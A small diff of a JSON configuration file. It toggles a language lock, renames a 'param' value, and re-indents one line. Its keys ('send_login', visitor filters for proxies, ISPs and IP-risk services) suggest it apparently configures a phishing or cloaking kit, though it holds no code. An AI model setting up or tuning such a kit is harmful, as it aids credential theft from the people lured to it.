@@ -1,12 +1,12 @@
 {
     "lc": {
-        "lock_lang": "1",
+        "lock_lang": "0",
         "default_lang": "en",
         "lock_country": "0",
         "allow_country": "AF"
     },
     "sp": {
-        "param": "kumon",
+        "param": "vkumon",
         "case": "verify",
         "one_time": "1",
         "send_login": "1",
@@ -23,7 +23,7 @@
         "dinamic": "0",
         "isp": "1",
         "proxy": "1",
-	"iphunter": "1",
+	    "iphunter": "1",
         "teoh": "1",
         "ipintel": "1",
         "iprisk": "1"
